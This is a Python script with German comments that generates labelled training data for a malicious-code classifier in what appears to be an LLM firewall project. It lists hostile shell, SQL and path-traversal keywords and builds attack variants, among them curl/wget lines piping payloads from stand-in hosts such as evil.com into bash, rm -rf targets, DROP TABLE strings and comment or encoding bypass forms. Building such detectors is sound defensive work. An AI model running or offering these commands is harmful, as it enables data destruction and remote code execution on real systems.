"""
Training Data Generator für Quantum-Inspired CNN
================================================

Generiert synthetische Trainingsdaten basierend auf bekannten Patterns.
Nutzt die eigene Detektor-Logik zur konsistenten Datenerzeugung.

Creator: HAK_GAL (Joerg Bollwahn)
Date: 2025-12-08
License: MIT
"""

import json
import random
import sys
from pathlib import Path
from typing import List, Dict, Tuple
import argparse

# Add project root to path
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root / "src"))
sys.path.insert(0, str(project_root / "detectors" / "code_intent_service"))


def get_malicious_patterns() -> List[Tuple[str, str]]:
    """Extrahiere alle malicious Patterns aus dem Code."""
    patterns = []
    
    # Basic patterns aus main.py
    basic_patterns = [
        # Shell commands
        ("rm -rf", "destructive_file_operation"),
        ("chmod 777", "permission_escalation"),
        ("curl http://", "remote_code_fetch"),
        ("wget http://", "remote_code_fetch"),
        ("nc -e", "reverse_shell"),
        ("bash -i", "interactive_shell"),
        ("/dev/tcp", "tcp_redirection"),
        
        # Code execution
        ("eval(", "code_execution"),
        ("exec(", "code_execution"),
        ("system(", "system_call"),
        ("popen(", "process_execution"),
        ("shell_exec", "shell_execution"),
        ("passthru", "passthru_execution"),
        
        # SQL injection
        ("DROP TABLE", "sql_destructive"),
        ("DELETE FROM", "sql_deletion"),
        ("TRUNCATE", "sql_truncation"),
        ("UNION SELECT", "sql_injection"),
        ("'; --", "sql_comment_injection"),
        
        # Path traversal
        ("../", "path_traversal"),
        ("..\\", "path_traversal_windows"),
        ("/etc/passwd", "sensitive_file_access"),
        ("/etc/shadow", "sensitive_file_access"),
    ]
    
    patterns.extend(basic_patterns)
    
    # Erweiterte Patterns (wenn verfügbar)
    try:
        from llm_firewall.patterns.advanced_patterns import get_pattern_library
        pattern_lib = get_pattern_library()
        advanced_patterns = pattern_lib.patterns
        
        for pattern in advanced_patterns:
            if pattern.category == "cybercrime":
                # Extrahiere Pattern-String aus Regex
                pattern_str = pattern.pattern.replace("r\"", "").replace("r'", "").replace("\"", "").replace("'", "")
                # Vereinfache Regex zu Basis-String
                pattern_str = pattern_str.split("(")[0] if "(" in pattern_str else pattern_str
                patterns.append((pattern_str, pattern.name))
    except ImportError:
        pass
    
    return patterns


def generate_malicious_variants(pattern: str, category: str) -> List[Dict]:
    """Generiere Varianten eines malicious Patterns."""
    samples = []
    
    # 1. Basismuster
    samples.append({
        "text": pattern,
        "label": 1,
        "category": category
    })
    
    # 2. Mit Kommentaren (Bypass-Versuche)
    comments = ["//", "#", "/*", "--", ";", "<!--", "REM"]
    for comment in comments:
        samples.append({
            "text": f"{comment} {pattern}",
            "label": 1,
            "category": category
        })
        samples.append({
            "text": f"{pattern} {comment} bypass",
            "label": 1,
            "category": category
        })
        samples.append({
            "text": f"{comment}\n{pattern}",
            "label": 1,
            "category": category
        })
    
    # 3. Mit Leerzeichen-Variationen
    whitespace_variants = [
        pattern.replace(" ", "\t"),
        pattern.replace(" ", "  "),  # Doppelte Leerzeichen
        pattern.replace(" ", "\n"),  # Newline statt Leerzeichen
        pattern.replace(" ", ""),    # Keine Leerzeichen
        " ".join(pattern.split()) + " ",  # Extra Leerzeichen am Ende
    ]
    for variant in whitespace_variants:
        if variant != pattern:  # Vermeide Duplikate
            samples.append({
                "text": variant,
                "label": 1,
                "category": category
            })
    
    # 4. Case-Variationen
    case_variants = [
        pattern.upper(),
        pattern.lower(),
        pattern.swapcase(),
        pattern.capitalize(),
    ]
    for variant in case_variants:
        if variant != pattern:
            samples.append({
                "text": variant,
                "label": 1,
                "category": category
            })
    
    # 5. In Kontext eingebettet
    contexts = [
        f"echo '{pattern}'",
        f"python -c \"{pattern}\"",
        f"bash -c '{pattern}'",
        f"sh -c \"{pattern}\"",
        f"cmd /c {pattern}",
        f"powershell -Command \"{pattern}\"",
        f"perl -e '{pattern}'",
        f"ruby -e \"{pattern}\"",
        f"node -e \"{pattern}\"",
        f"eval({pattern})",
        f"exec({pattern})",
    ]
    for context in contexts:
        samples.append({
            "text": context,
            "label": 1,
            "category": category
        })
    
    # 6. Mit zusätzlichen Parametern/Variationen
    if "rm -rf" in pattern.lower():
        targets = ["/tmp", "/var", "/home", "/root", "/etc", "*", ".."]
        for target in targets:
            samples.append({
                "text": f"{pattern} {target}",
                "label": 1,
                "category": category
            })
            samples.append({
                "text": f"{pattern} {target} && echo done",
                "label": 1,
                "category": category
            })
    
    if "DROP TABLE" in pattern.upper() or "DELETE FROM" in pattern.upper():
        tables = ["users", "logs", "sessions", "data", "backup"]
        for table in tables:
            samples.append({
                "text": f"{pattern} {table};",
                "label": 1,
                "category": category
            })
            samples.append({
                "text": f"{pattern} {table}; -- SQL injection",
                "label": 1,
                "category": category
            })
    
    if "curl" in pattern.lower() or "wget" in pattern.lower():
        urls = ["evil.com/payload.sh", "malicious.site/script.py", "attacker.net/backdoor"]
        for url in urls:
            samples.append({
                "text": f"{pattern}{url} | bash",
                "label": 1,
                "category": category
            })
            samples.append({
                "text": f"{pattern}{url} && python payload.py",
                "label": 1,
                "category": category
            })
    
    # 7. Encoding-Variationen (Bypass-Versuche)
    if len(pattern) > 0:
        # URL-Encoding
        try:
            import urllib.parse
            url_encoded = urllib.parse.quote(pattern)
            if url_encoded != pattern:
                samples.append({
                    "text": url_encoded,
                    "label": 1,
                    "category": category
                })
        except:
            pass
        
        # Base64-ähnliche Variationen (vereinfacht)
        if " " in pattern:
            samples.append({
                "text": pattern.replace(" ", "%20"),
                "label": 1,
                "category": category
            })
            samples.append({
                "text": pattern.replace(" ", "+"),
                "label": 1,
                "category": category
            })
    
    # 8. Kombinationen mit anderen Patterns
    if len(samples) < 50:  # Wenn noch nicht genug Varianten
        # Füge Kombinationen hinzu
        dangerous_ops = ["&&", "|", ";", "||"]
        for op in dangerous_ops:
            samples.append({
                "text": f"{pattern} {op} echo success",
                "label": 1,
                "category": category
            })
    
    return samples


def generate_benign_samples() -> List[Dict]:
    """
    Generiere KLARE benigne Samples (harmlose Commands/Code).
    
    WICHTIG: Diese Samples müssen eindeutig unverdächtig sein,
    keine Keywords enthalten, die auch in malicious Patterns vorkommen.
    """
    samples = []
    
    # ============================================================
    # KLARE benigne Shell-Commands (keine verdächtigen Keywords)
    # ============================================================
    benign_commands = [
        # Informative Commands
        "echo 'Hello World'",
        "echo $HOME",
        "pwd",
        "date",
        "whoami",
        "uname -a",
        
        # File Operations (nur lesend, keine destruktiven)
        "cat README.md",
        "head -n 10 file.txt",
        "tail -f log.txt",
        "wc -l file.txt",
        "sort file.txt",
        "uniq file.txt",
        "grep 'pattern' file.txt",
        "find . -name '*.py'",
        
        # Safe List Operations
        "ls -la",
        "ls -lh",
        "ls -R",
        "dir",
        "tree -L 2",
        
        # Network (nur lesend)
        "ping -c 3 google.com",
        "curl -I https://example.com",
        "wget --spider https://example.com",
        
        # System Info (nur lesend)
        "df -h",
        "free -m",
        "uptime",
        "ps aux",
    ]
    
    for cmd in benign_commands:
        samples.append({
            "text": cmd,
            "label": 0,
            "category": "benign_shell"
        })
    
    # ============================================================
    # KLARE benigne SQL-Queries (nur SELECT, keine destruktiven)
    # ============================================================
    benign_sql = [
        # Simple SELECTs
        "SELECT * FROM users WHERE id = 1",
        "SELECT name, email FROM users",
        "SELECT COUNT(*) FROM orders",
        "SELECT * FROM products WHERE price > 100",
        "SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id",
        
        # Safe INSERTs (keine DROP/DELETE)
        "INSERT INTO logs (message, timestamp) VALUES ('info', NOW())",
        "INSERT INTO users (name, email) VALUES ('John', 'john@example.com')",
        
        # Safe UPDATEs (mit WHERE, keine TRUNCATE)
        "UPDATE users SET last_login = NOW() WHERE id = 1",
        "UPDATE products SET price = 99.99 WHERE id = 123",
        
        # Joins und Aggregations
        "SELECT category, COUNT(*) FROM products GROUP BY category",
        "SELECT user_id, SUM(amount) FROM orders GROUP BY user_id",
    ]
    
    for sql in benign_sql:
        samples.append({
            "text": sql,
            "label": 0,
            "category": "benign_sql"
        })
    
    # ============================================================
    # KLARE benigne Python-Code (keine exec/eval/system)
    # ============================================================
    benign_python = [
        # Imports (sicher)
        "import os",
        "import sys",
        "import json",
        "import math",
        "from datetime import datetime",
        
        # Basic Operations
        "print('Hello')",
        "x = 1 + 2",
        "result = sum([1, 2, 3])",
        "text = 'Hello World'.upper()",
        "items = [x for x in range(10)]",
        
        # Functions (sicher)
        "def hello(): return 'world'",
        "def calculate_sum(a, b): return a + b",
        "def factorial(n): return 1 if n <= 1 else n * factorial(n-1)",
        
        # Data Structures
        "data = {'key': 'value'}",
        "numbers = [1, 2, 3, 4, 5]",
        "name = 'John Doe'",
        
        # Loops (sicher)
        "for i in range(10): print(i)",
        "for item in items: process(item)",
        "while count < 10: count += 1",
        
        # File Operations (nur lesend)
        "with open('file.txt', 'r') as f: content = f.read()",
        "data = json.load(open('data.json'))",
        
        # String Operations
        "text = 'hello world'.title()",
        "words = 'hello world'.split()",
        "result = 'test'.replace('t', 'T')",
    ]
    
    for code in benign_python:
        samples.append({
            "text": code,
            "label": 0,
            "category": "benign_python"
        })
    
    # ============================================================
    # Normale Fragen/Text (keine Code-Patterns)
    # ============================================================
    benign_text = [
        "What is the weather today?",
        "How do I install Python?",
        "Can you help me with this?",
        "What time is it?",
        "Please explain this code",
        "How does this function work?",
        "Show me an example",
        "What is the difference between X and Y?",
        "How can I improve my code?",
        "What are best practices for this?",
        "Can you review my code?",
        "What does this error mean?",
    ]
    
    for text in benign_text:
        samples.append({
            "text": text,
            "label": 0,
            "category": "benign_text"
        })
    
    # ============================================================
    # "Harte" Samples - Ähnlich zu malicious, aber eindeutig benign
    # ============================================================
    hard_benign_samples = [
        # Ähnlich zu "eval", aber sicher
        "result = evaluator.calculate('2+2')",
        "value = math_eval('sqrt(16)')",
        "output = safe_eval('1+1')",
        
        # Ähnlich zu "system", aber sicher
        "status = system_info.get_uptime()",
        "result = system_check.is_healthy()",
        
        # Ähnlich zu "exec", aber sicher
        "code = executor.compile('print(1)')",
        "result = code_executor.run('safe_code')",
        
        # Kommentare mit verdächtigen Keywords (aber nur Kommentare)
        "# TODO: Remove debug line: system('ls')",
        "# Note: This uses eval() internally, but it's safe",
        "// This function calls exec(), but with sanitized input",
        
        # Getarnte Patterns in Strings (nicht ausgeführt)
        "message = 'rm -rf /tmp'",
        "log_entry = 'DROP TABLE users'",
        "example_code = 'bash -i >& /dev/tcp/...'",
    ]
    
    for sample in hard_benign_samples:
        samples.append({
            "text": sample,
            "label": 0,
            "category": "benign_hard"
        })
    
    return samples


def generate_training_dataset(
    num_malicious: int = 1000,
    num_benign: int = 1000,
    output_path: str = "data/train/quantum_cnn_training.jsonl"
) -> Tuple[List[Dict], List[Dict], List[Dict]]:
    """
    Generiere vollständigen Trainings-Datensatz.
    
    Args:
        num_malicious: Anzahl malicious Samples
        num_benign: Anzahl benign Samples
        output_path: Ausgabe-Pfad
    
    Returns:
        (train_samples, val_samples, test_samples)
    """
    print("=" * 80)
    print("TRAINING DATA GENERATOR")
    print("=" * 80)
    print()
    
    # 1. Lade Patterns
    print("📋 Lade Patterns...")
    patterns = get_malicious_patterns()
    print(f"   Gefunden: {len(patterns)} Patterns")
    print()
    
    # 2. Generiere Malicious Samples
    print("🔴 Generiere Malicious Samples...")
    all_malicious = []
    for pattern, category in patterns:
        variants = generate_malicious_variants(pattern, category)
        all_malicious.extend(variants)
    
    print(f"   Total Varianten generiert: {len(all_malicious)}")
    
    # Wenn nicht genug, dupliziere und variiere weiter
    if len(all_malicious) < num_malicious:
        print(f"   ⚠️  Nur {len(all_malicious)} Varianten, generiere mehr...")
        # Dupliziere und füge weitere Variationen hinzu
        base_samples = all_malicious.copy()
        while len(all_malicious) < num_malicious:
            for sample in base_samples[:min(100, len(base_samples))]:  # Erste 100 als Basis
                # Füge zufällige Variationen hinzu
                text = sample["text"]
                variations = [
                    f"# {text}",
                    f"// {text}",
                    f"{text} # bypass",
                    f"echo '{text}'",
                    f"eval('{text}')",
                ]
                for var_text in variations:
                    if len(all_malicious) >= num_malicious:
                        break
                    all_malicious.append({
                        "text": var_text,
                        "label": 1,
                        "category": sample["category"]
                    })
                if len(all_malicious) >= num_malicious:
                    break
    
    # Zufällig auswählen bis gewünschte Anzahl erreicht
    random.shuffle(all_malicious)
    malicious_samples = all_malicious[:num_malicious]
    print(f"   Generiert: {len(malicious_samples)} malicious Samples")
    print()
    
    # 3. Generiere Benign Samples
    print("🟢 Generiere Benign Samples...")
    all_benign = generate_benign_samples()
    
    # Dupliziere und variiere bis gewünschte Anzahl
    while len(all_benign) < num_benign:
        # Füge Varianten hinzu
        base_samples = generate_benign_samples()
        for sample in base_samples:
            # Varianten mit Leerzeichen
            variant = sample.copy()
            variant["text"] = sample["text"].replace(" ", "  ")
            all_benign.append(variant)
        
        # Varianten mit Kommentaren
        for sample in base_samples[:10]:
            variant = sample.copy()
            variant["text"] = f"# {sample['text']}"
            all_benign.append(variant)
    
    random.shuffle(all_benign)
    benign_samples = all_benign[:num_benign]
    print(f"   Generiert: {len(benign_samples)} benign Samples")
    print()
    
    # 4. Balance Samples (wichtig für Training!)
    print("⚖️  Balance Samples...")
    
    # Stelle sicher, dass wir genug Samples haben
    min_samples = min(len(malicious_samples), len(benign_samples))
    
    if len(malicious_samples) > min_samples:
        print(f"   Reduziere malicious Samples: {len(malicious_samples)} → {min_samples}")
        random.shuffle(malicious_samples)
        malicious_samples = malicious_samples[:min_samples]
    
    if len(benign_samples) > min_samples:
        print(f"   Reduziere benign Samples: {len(benign_samples)} → {min_samples}")
        random.shuffle(benign_samples)
        benign_samples = benign_samples[:min_samples]
    
    print(f"   Final: {len(malicious_samples)} malicious, {len(benign_samples)} benign")
    print()
    
    # 5. Split in Train/Val/Test (70/15/15) - STRATIFIED
    print("📊 Split in Train/Val/Test (stratified)...")
    
    # Split malicious
    random.shuffle(malicious_samples)
    malicious_train_end = int(len(malicious_samples) * 0.7)
    malicious_val_end = int(len(malicious_samples) * 0.85)
    
    malicious_train = malicious_samples[:malicious_train_end]
    malicious_val = malicious_samples[malicious_train_end:malicious_val_end]
    malicious_test = malicious_samples[malicious_val_end:]
    
    # Split benign
    random.shuffle(benign_samples)
    benign_train_end = int(len(benign_samples) * 0.7)
    benign_val_end = int(len(benign_samples) * 0.85)
    
    benign_train = benign_samples[:benign_train_end]
    benign_val = benign_samples[benign_train_end:benign_val_end]
    benign_test = benign_samples[benign_val_end:]
    
    # Kombiniere
    train_samples = malicious_train + benign_train
    val_samples = malicious_val + benign_val
    test_samples = malicious_test + benign_test
    
    # Shuffle final sets
    random.shuffle(train_samples)
    random.shuffle(val_samples)
    random.shuffle(test_samples)
    
    total = len(train_samples) + len(val_samples) + len(test_samples)
    print(f"   Train: {len(train_samples)} ({len(train_samples)/total*100:.1f}%)")
    print(f"   Val:   {len(val_samples)} ({len(val_samples)/total*100:.1f}%)")
    print(f"   Test:  {len(test_samples)} ({len(test_samples)/total*100:.1f}%)")
    print()
    
    # 5. Speichere
    print(f"💾 Speichere nach {output_path}...")
    output_file = Path(output_path)
    output_file.parent.mkdir(parents=True, exist_ok=True)
    
    with open(output_file, 'w', encoding='utf-8') as f:
        for sample in train_samples:
            f.write(json.dumps(sample, ensure_ascii=False) + '\n')
    
    # Val und Test in separate Dateien
    val_path = output_path.replace('.jsonl', '_val.jsonl')
    test_path = output_path.replace('.jsonl', '_test.jsonl')
    
    with open(val_path, 'w', encoding='utf-8') as f:
        for sample in val_samples:
            f.write(json.dumps(sample, ensure_ascii=False) + '\n')
    
    with open(test_path, 'w', encoding='utf-8') as f:
        for sample in test_samples:
            f.write(json.dumps(sample, ensure_ascii=False) + '\n')
    
    print(f"   ✓ Train: {output_path}")
    print(f"   ✓ Val:   {val_path}")
    print(f"   ✓ Test:  {test_path}")
    print()
    
    # 6. Statistiken
    print("📈 Statistiken:")
    train_malicious = sum(1 for s in train_samples if s['label'] == 1)
    train_benign = sum(1 for s in train_samples if s['label'] == 0)
    print(f"   Train - Malicious: {train_malicious}, Benign: {train_benign}")
    
    val_malicious = sum(1 for s in val_samples if s['label'] == 1)
    val_benign = sum(1 for s in val_samples if s['label'] == 0)
    print(f"   Val   - Malicious: {val_malicious}, Benign: {val_benign}")
    
    test_malicious = sum(1 for s in test_samples if s['label'] == 1)
    test_benign = sum(1 for s in test_samples if s['label'] == 0)
    print(f"   Test  - Malicious: {test_malicious}, Benign: {test_benign}")
    print()
    
    print("=" * 80)
    print("✅ DATASET GENERIERUNG ABGESCHLOSSEN")
    print("=" * 80)
    
    return train_samples, val_samples, test_samples


def main():
    parser = argparse.ArgumentParser(description="Generate training data for Quantum-Inspired CNN")
    parser.add_argument(
        "--malicious",
        type=int,
        default=1000,
        help="Number of malicious samples (default: 1000)"
    )
    parser.add_argument(
        "--benign",
        type=int,
        default=1000,
        help="Number of benign samples (default: 1000)"
    )
    parser.add_argument(
        "--output",
        type=str,
        default="data/train/quantum_cnn_training.jsonl",
        help="Output path for training data (default: data/train/quantum_cnn_training.jsonl)"
    )
    parser.add_argument(
        "--seed",
        type=int,
        default=42,
        help="Random seed for reproducibility (default: 42)"
    )
    
    args = parser.parse_args()
    
    # Setze Random Seed
    random.seed(args.seed)
    
    # Generiere Dataset
    generate_training_dataset(
        num_malicious=args.malicious,
        num_benign=args.benign,
        output_path=args.output
    )


if __name__ == "__main__":
    main()
